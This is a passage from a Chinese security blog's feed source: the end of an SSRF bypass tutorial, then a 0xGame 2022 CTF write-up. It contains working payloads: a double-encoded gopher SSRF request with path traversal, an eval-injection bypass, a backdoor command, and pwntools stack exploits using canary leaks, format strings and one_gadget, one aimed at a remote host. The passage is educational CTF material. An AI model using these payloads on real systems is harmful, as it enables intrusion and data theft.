href="#5-4-其他绕过方式：" class="headerlink" title="5.4 其他绕过方式："></a>5.4 其他绕过方式：</h4><p><strong>利用特殊域名利用[::]</strong></p><p><strong>可以利用[::]来绕过localhost</strong></p><blockquote><p style="color:orange;">http://169.254.169.254>>http://[::169.254.169.254] </p></blockquote><blockquote><p style="color:orange;">利用句号: 127。0。0。1 >>> 127.0.0.1</p></blockquote><p><strong>CRLF 编码绕过</strong></p><blockquote><p>%0d-&gt;0x0d-&gt;\r回车        %0a-&gt;0x0a-&gt;\n换行        进行HTTP头部注入</p><p style="color:orange;">example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a </p></blockquote><p><strong>封闭的字母数字</strong></p><h3 id="六、常见限制及对应方式："><a href="#六、常见限制及对应方式：" class="headerlink" title="六、常见限制及对应方式："></a>六、常见限制及对应方式：</h3><p>1.限制为<a href="http://www.xxx.com/">http://www.xxx.com</a> 域名</p><blockquote><p style="color:orange;">采用http基本身份认证的方式绕过，即@http://www.xxx.com@www.xxc.com</p></blockquote><p>2.限制请求IP不为内网地址</p><blockquote><p style="color:orange;">当不允许ip为内网地址时：采取短网址绕过、采取特殊域名、采取进制转换</p></blockquote><p>3.限制请求只为http协议</p><blockquote><p style="color:orange;">采取302跳转、采取短地址</p></blockquote><h3 id="七、免责声明"><a href="#七、免责声明" class="headerlink" title="七、免责声明"></a>七、免责声明</h3><blockquote><p style="color:red;">本课程及所讲述的所有技术仅能在取得足够合法授权的企业安全建设中使用，在使用学习本课程的过程中，您应确保自己所有行为符合当地的法律法规。 如您在学习本课程后中存在任何非法行为，您将自行承担所有后果，本课程所有开发者和所有贡献者不承担任何法律及连带责任。 除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要阅读本课程。 您的阅读行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> SSRF漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0xGame 2022 WriteUp</title>
      <link href="/2022/10/11/0xGame%202022%20WriteUp/"/>
      <url>/2022/10/11/0xGame%202022%20WriteUp/</url>
      
        <content type="html"><![CDATA[<h1>0xGame2022</h1><p>[toc]</p><h2 id="web">Web</h2><h3 id="ssrf-me">SSRF Me</h3><p>进入题目，可以直接看到源码，看到存在curl，那么这里大概率存在一个ssrf的漏洞，然后看到ban了一些关键词，先用http测试一下，去curl百度发现会有回显，那么就确定这是可以利用的ssrf的漏洞，反正有个<code>read.php</code>先访问一下发现返回<code>Allow local only</code>，只允许本地访问那么我们可以用那个ssrf漏洞，去访问这个页面，这里127.0.0.1被过滤了，但是还有其他的方式可以代替本地。</p><pre class="line-numbers language-none"><code class="language-none">?url&#x3D;http:&#x2F;&#x2F;0.0.0.0&#x2F;read.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就可以发现源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'127.0.0.1'</span><span class="token operator">!=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Allow local only'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'GET'</span> <span class="token operator">===</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid request mode'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/..\//'</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现这里有个file_get_contents可以任意文件读取所以我们通过这里取读取flag，但是这里是需要post请求，我们怎么通过curl去发起一个post请求呢，这个时候我们去了解到gopher协议，他可以去发送post请求，那么就只需要我们去构造数据流就可以了。</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;read.php HTTP&#x2F;1.1Host: 0.0.0.0Content-Type:application&#x2F;x-www-form-urlencodedContent-Length: 13name&#x3D;%252ffla%2567<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们发送的原始数据包是这样的，这里因为存在urldecode所以我们可以通过双重url编码去绕过对flag的过滤</p><p>那么我们对上面的数据包进行一次url编码把其中的%0a替换为%0d%0a然后再编码一次，就可以打通了</p><pre class="line-numbers language-none"><code class="language-none">POST%2520&#x2F;read.php%2520HTTP&#x2F;1.1%250D%250AHost%253A%25200.0.0.0%250D%250AContent-Type%253Aapplication&#x2F;x-www-form-urlencoded%250D%250AContent-Length%253A%252073%250D%250A%250D%250Aname%253D%2525252e%2525252e%2525252f%2525252e%2525252e%2525252f%2525252e%2525252e%2525252f%2525252e%2525252e%2525252ffla%25252567<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="no-way-to-go">no_way_to_go</h3><pre class="line-numbers language-htm" data-language="htm"><code class="language-htm">爷累了，爷就是不想写前端嗯？？？我代码中怎么有 eval(&#39;echo &#39;.&#39;Welcome &#39;.$str.&#39;;&#39;)算了不管了，试着POST一个 N1k0la 吧<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>按照题目提示，POST 传参 N1k0la ，以及关键代码得知</p><p>要先用<code>;</code>闭合 echo，然后就可以命令执行了</p><p>经过 fuzz，发现禁用了很多函数，那就需要点其他方法</p><p><code>N1k0la=;var_dump(scandir(getcwd()))</code></p><p>可以看到有个<code>fllllll4444444g.php</code>，</p><p>将名称转化为 ascii 码，然后利用show_source来读取</p><p><code>chr(102).chr(108).chr(108).chr(108).chr(108).chr(108).chr(108).chr(52).chr(52).chr(52).chr(52).chr(52).chr(52).chr(52).chr(103).chr(46).chr(112).chr(104).chr(112)</code></p><h3 id="backdoor">BackDoor</h3><p><a href="https://www.jb51.net/article/57928.htm">https://www.jb51.net/article/57928.htm</a></p><p>根据thinkphp路由的规则可以轻易的来调用预留的后门，然后去找一下真的flag，</p><p>index.php/Index/backdoor?command=find / -name fl*</p><p>就可以找到<code>/tmp/sess_08j0e9v6uj9d1ed9dcrp4nltt2/fllaaagggg</code></p><h2 id="pwn">Pwn</h2><h3 id="leak-me">leak_me</h3><p>不管是puts还是printf输出</p><p>都是遇到\x00就截止</p><p>而栈上存有着大量的数据 包括pie地址 libc地址 栈地址等等</p><p>而输出的时候没有memset去清空的话</p><p>就可以导致填充的字符串和栈上的数据连起来一并被输出 从而造成泄露</p><p>（注意canary的最低位必定是\x00，所以要多覆盖一位）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>r<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./main'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.23.so"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x39</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">)</span>canary<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x61</span>success<span class="token punctuation">(</span><span class="token string">"canary: "</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x48</span><span class="token punctuation">)</span>libc_base<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span>p16<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__libc_start_main"</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">240</span>success<span class="token punctuation">(</span><span class="token string">"libc_base: "</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>one_gadget<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x45226</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"exit\x00"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="canary-eats-pie">canary_eats_pie</h3><p>开头有个格式化字符串漏洞</p><p>格式化字符串漏洞可以用来写入也可以用来读取</p><p>所以再通过泄露在栈上的canary地址以及libc地址之后</p><p>用one_gadget一把梭</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>r<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'121.4.15.155'</span><span class="token punctuation">,</span><span class="token number">10010</span><span class="token punctuation">)</span><span class="token comment">#r=process('./main')</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'%13$p\n%15$p\n'</span><span class="token punctuation">)</span>canary<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>libc_base<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0xf0</span>one_gadget<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x45226</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="misc">Misc</h2><h3 id="easypython">EasyPython</h3><p>8进制转字符串，2020纵横杯签到题</p><h3 id="pork-factory">Pork Factory</h3><p>猪圈密码→得到密码MEAT→Cloacked-pixel脚本解得图片的地址，访问获取图片，倾斜的二维码一张。各凭本事改变图片形状。官方wp是使用imagemagick→Transform→Shear(X degress:45 Y degrses:45)操作2次。扫描得到培根，解得flag。</p><h3 id="easydisk">EasyDisk</h3><p>根据题目描述配置FTK Imager环境，配有一张明显需要改宽高的图片，改宽高后得到KEY，装载加密的磁盘，得到另一张图片，双图考虑盲水印。Blind-Wtaermark伺候，得到的结果有点难以使用肉眼辨认，但经过仔细观察以及图片提示的相关信息，还是能够得到flag的。</p><h3 id="周深的声音">周深的声音</h3><p>先用<code>deepsound</code>提取出<code>flag.txt</code>，再将其中的<code>base64</code>编码转图片，之后再用<code>outguess</code>破解图片中隐写的信息数据，使用命令：<code>outguess -r XXX.jpg -t flag.txt</code>即可。</p><h2 id="crypto">Crypto</h2><h3 id="cryptosignin3">CryptoSignin3</h3><p>题目是给出了RSA加密中的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo separator="true">,</mo><mi>n</mi><mo separator="true">,</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">e,n,c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">c</span></span></span></span>，让你求出<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn><mi>m</mi></mrow><annotation encoding="application/x-tex">5m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span><span class="mord mathdefault">m</span></span></span></span>的加密结果（默认<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">c</span></span></span></span>是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span></span></span></span>的加密结果）。</p><p>这道题主要考察RSA的乘法同态性，由于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>m</mi><mi>e</mi></msup><mo>≡</mo><mi>c</mi><mspace></mspace><mspace width="0.4444444444444444em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">m^e \equiv c \pmod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.4444444444444444em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>，因此我们有</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>5</mn><mi>m</mi><msup><mo stretchy="false">)</mo><mi>e</mi></msup><mo>≡</mo><msup><mn>5</mn><mi>e</mi></msup><msup><mi>m</mi><mi>e</mi></msup><mo>≡</mo><msup><mn>5</mn><mi>e</mi></msup><mi>c</mi><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(5m)^e\equiv 5^em^e\equiv 5^ec \pmod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">5</span><span class="mord mathdefault">m</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">5</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">5</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mord mathdefault">c</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></span></p><p>因此，我们只需要计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>5</mn><mi>e</mi></msup><mi>c</mi><mspace></mspace><mspace width="0.6666666666666666em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">5^{e}c \mod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord">5</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">c</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6666666666666666em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span></span></span></span>的值即可。然后转一下<code>str</code>类型，取最后25位即可。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">n<span class="token operator">=</span><span class="token number">2422711508900009723470102727278184898228579351729629175495904760516536114771819178772843940622693480942295987032442940867670858858530606887743557817380121361626756206355705110299827107648704348792184242506797212331641569408152865458082131811787893384573565771304686373397987779236692592582009393836324438173880350455958049987506807351970912049246353746635267159741115761548052126938491673479606393396100458729618059852813438444299361468512008386975558106274324688665963516424534366163011821633197140729560513838981241752422348968312410911097523311183305812013220724215584901550592570168096761576532621840320623463208702401829189862290303098674021012353400081288819532365151476738751064469957971192132666136590103567843662591585345483671185892760751481722342403025068374371716176981888876927119331602694699049322860285991375002326127401769287658952682585275891296760732815680898653162425658904911584903825163141576325803464119867837508173795728753701563149748508464162635777787788266240105654089919642728171076155284842273517797069725130328742992830894075552022372717019366081516680737</span>e<span class="token operator">=</span><span class="token number">10007</span>c<span class="token operator">=</span><span class="token number">1285901843278876234855607310979623200548989981628646673003523113580651626686523566799395153922258813222744927018205882436414589516795415393990321785993777190284046937462277341231780571523062023964463963139910673601962881978696384360480028132774373962893042697866284303407898274683337284548529324550392212212259945699167254341062208031468355814520907121576009140399280898693924706067921614961798886587174234822238887374399666546113213239071736098162263227821798099750616137755055435397986788792824117529508255014392344357337010003489080209442530630893119917536518243474797351694663533728052713570044084663268350004738561234330890283895430742958255842196396542672482459665354739161276178850775803757753274712331067038077233072381051447436014423088822190073982228377699578821863871042501139434131053044240618505423456248872825597521393564957261041606004454706987978944644129728005540587982321571481413548381251589071459468890948819121023006292105804319208332473499823959882524985324120811768843639294924500467781666073366713198751960913508720530656411097981933156605831180926219778514434</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">*</span>c<span class="token operator">%</span>n<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">25</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果为：<code>8489769636593649908538102</code>，因此flag为<code>0xGame&#123;8489769636593649908538102&#125;</code></p><p>RSA的同态性是一个很重要的知识点，在可以获得解密服务的服务器上，可以利用RSA的同态性，发送<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mi>e</mi></msup><mi>c</mi><mo separator="true">,</mo><msup><mn>3</mn><mi>e</mi></msup><mi>c</mi><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">2^ec,3^ec,...</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.858832em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mord mathdefault">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mord mathdefault">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span></span></span></span>等结果，获取解密服务，进而获取明文的一些性质，比如<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mi>m</mi></mrow><annotation encoding="application/x-tex">2m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord mathdefault">m</span></span></span></span>的情况、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn><mi>m</mi></mrow><annotation encoding="application/x-tex">3m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord mathdefault">m</span></span></span></span>的情况等等（<strong>出题人在这里似乎在疯狂暗示这什么</strong>）。</p><h3 id="wilson">Wilson</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span> bytes_to_long<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> next_prime<span class="token comment"># length of flag is 37</span>p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>q <span class="token operator">=</span> next_prime<span class="token punctuation">(</span>p<span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qnoise <span class="token operator">=</span> <span class="token number">1</span><span class="token 